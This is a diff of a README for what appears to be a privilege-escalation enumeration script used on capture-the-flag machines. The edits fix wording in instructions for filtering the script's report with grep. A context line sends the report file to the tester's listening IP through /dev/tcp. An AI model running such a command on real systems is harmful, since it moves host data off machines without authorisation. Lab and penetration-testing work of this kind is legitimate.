@@ -58,11 +58,11 @@ cat report.txt > /dev/tcp/192.168.43.1/1111
 
 **Remember to change the IP address by your own IP address**
 
-*Sometimes some directories are printed in the enumeration while there are not too useful for us. For example too many logs from /snap/ or bunch of files in /var/www/. When this happen just do the following:*
+*Sometimes some directories are printed in the repo.txt while they are not too useful. For example too many logs from /snap/ or bunch of files in /var/www/. When this happen just do the following:*
 
 Taking example of /snap/ `cat report.txt | grep -v '/snap/' > report_clean.txt` 
 
-Assuming you have many directory that you want to remove (Ex: /var/www/html, /snap/), you can do it in one command `cat report.txt | grep -v '/snap/\|/var/www/html' > report_clean.txt`
+Assuming you have many directories that you want to remove (Ex: /var/www/html, /snap/), you can do it in one command `cat report.txt | grep -v '/snap/\|/var/www/html' > report_clean.txt`
 
 As said previously, this script has been written from experiences. I've root more that 100 machines on vulhub and more than 50 on HackTheBox. You can check my HackTheBox profile [here](https://www.hackthebox.eu/home/users/profile/171842). 
 
